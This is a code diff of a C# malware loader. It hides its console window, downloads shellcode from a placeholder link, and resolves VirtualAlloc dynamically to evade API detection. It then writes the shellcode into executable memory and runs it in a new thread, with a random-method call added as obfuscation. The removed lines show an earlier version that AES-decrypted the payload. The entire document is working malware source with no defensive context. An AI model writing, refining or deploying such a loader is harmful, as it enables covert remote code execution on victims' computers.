@@ -2,72 +2,53 @@ using System;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Reflection;
-using System.Security.Cryptography;
 
 class Program
 {
     static void Main(string[] args)
     {
-        // Hide the console window
+        HideConsoleWindow();
+        byte[] shellcode = DownloadShellcode("[DOWNLOAD_LINK]");
+        IntPtr memory = AllocateMemory(shellcode.Length);
+        CopyShellcodeToMemory(shellcode, memory);
+        ExecuteShellcode(memory);
+        ObfuscateExecution();
+    }
+
+    static void HideConsoleWindow()
+    {
         var handle = GetConsoleWindow();
         ShowWindow(handle, SW_HIDE);
-
-        // Download shellcode
-        byte[] encryptedShellcode = DownloadShellcode("[DOWNLOAD_LINK]");
-        byte[] shellcode = DecryptShellcode(encryptedShellcode);
-
-        // Allocate memory and copy shellcode
-        IntPtr allocatedMemory = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
-        Marshal.Copy(shellcode, 0, allocatedMemory, shellcode.Length);
-
-        // Create thread to execute shellcode
-        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, IntPtr.Zero);
-        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
-
-        // Call a random method to obfuscate further
-        CallRandomMethod();
     }
 
     static byte[] DownloadShellcode(string url)
     {
-        using (WebClient wc = new WebClient())
-        {
-            return wc.DownloadData(url);
-        }
+        WebClient wc = new WebClient();
+        return wc.DownloadData(url);
     }
 
-    static byte[] DecryptShellcode(byte[] data)
+    static IntPtr AllocateMemory(int size)
     {
-        byte[] key = new byte[32]; // Replace with your key
-        byte[] iv = new byte[16]; // Replace with your IV
-
-        using (Aes aes = Aes.Create())
-        {
-            aes.Key = key;
-            aes.IV = iv;
-            using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
-            {
-                return PerformCryptography(data, decryptor);
-            }
-        }
+        IntPtr kernel32 = LoadLibrary("kernel32.dll");
+        IntPtr virtualAllocAddr = GetProcAddress(kernel32, "VirtualAlloc");
+        VirtualAllocDelegate virtualAlloc = (VirtualAllocDelegate)Marshal.GetDelegateForFunctionPointer(virtualAllocAddr, typeof(VirtualAllocDelegate));
+        return virtualAlloc(IntPtr.Zero, (uint)size, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
     }
 
-    static byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
+    static void CopyShellcodeToMemory(byte[] shellcode, IntPtr memory)
     {
-        using (System.IO.MemoryStream ms = new System.IO.MemoryStream())
-        {
-            using (CryptoStream cs = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
-            {
-                cs.Write(data, 0, data.Length);
-                cs.FlushFinalBlock();
-                return ms.ToArray();
-            }
-        }
+        Marshal.Copy(shellcode, 0, memory, shellcode.Length);
     }
 
-    static void CallRandomMethod()
+    static void ExecuteShellcode(IntPtr memory)
     {
-        MethodInfo[] methods = typeof(BenignClass).GetMethods(BindingFlags.Public | BindingFlags.Static);
+        IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, memory, IntPtr.Zero, 0, IntPtr.Zero);
+        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+    }
+
+    static void ObfuscateExecution()
+    {
+        MethodInfo[] methods = typeof(ObfuscationClass).GetMethods(BindingFlags.Public | BindingFlags.Static);
         Random rand = new Random();
         int index = rand.Next(methods.Length);
         methods[index].Invoke(null, null);
@@ -110,20 +91,20 @@ class Program
     }
 }
 
-class BenignClass
+class ObfuscationClass
 {
-    public static void Methodexecuted1()
+    public static void Obfuscate1()
     {
-        Console.WriteLine("Method1 is execoputed.");
+        Console.WriteLine("Obfuscate method 1 executed.");
     }
 
-    public static void Methodexecuted2()
+    public static void Obfuscate2()
     {
-        Console.WriteLine("Method2 are execoputed.");
+        Console.WriteLine("Obfuscate method 2 executed.");
     }
 
-    public static void Methodexecuted3()
+    public static void Obfuscate3()
     {
-        Console.WriteLine("Method3 had execoputed.");
+        Console.WriteLine("Obfuscate method 3 executed.");
     }
 }
